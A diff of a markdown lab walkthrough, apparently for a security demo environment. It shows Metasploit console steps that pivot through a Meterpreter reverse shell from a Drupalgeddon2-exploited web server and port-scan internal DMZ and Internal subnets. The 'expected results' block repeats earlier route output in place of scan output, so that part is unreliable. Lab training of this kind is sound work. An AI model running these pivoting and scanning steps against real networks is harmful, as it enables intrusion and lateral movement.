@@ -522,14 +522,39 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) >
 ```
     
 **Route traffic to the Internal Network through the esablished reverse shell**
-1.	 Type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
+1.	Type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
 
 ```console
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
 [*] Route added
 ```
-    
-6. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
+2.	Follow the below steps to run a portscan to discover any running services on the **DMZ** and **Internal** Segments.
+    * Type **use auxiliary/scanner/portscan/tcp** to select the portscan module
+    * Type **set THREADS 50** 
+    * Type **set RHOSTS 192.168.10.0/24, 192.168.20.0/24** to define the subnets to scan. These should match the **DMZ** and **Internal** Subnets
+    * Type **set PORTS 8080,5984** to define the ports to scan (Drupal and CouchDB servers)
+    * Type **run
+
+```console
+msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) > set THREADS 50
+THREADS => 50
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.10.0/24, 192.168.20.0/24
+RHOSTS => 192.168.10.0/24, 192.168.20.0/24
+msf5 auxiliary(scanner/portscan/tcp) > set PORTS 8080,5984
+PORTS => 8080,5984
+msf5 auxiliary(scanner/portscan/tcp) > run
+
+```
+
+3.	It may take a while for the scan to complete, but you should see the below results when it does:
+
+```console
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
+[*] Route added
+```
+
+
 
 
 
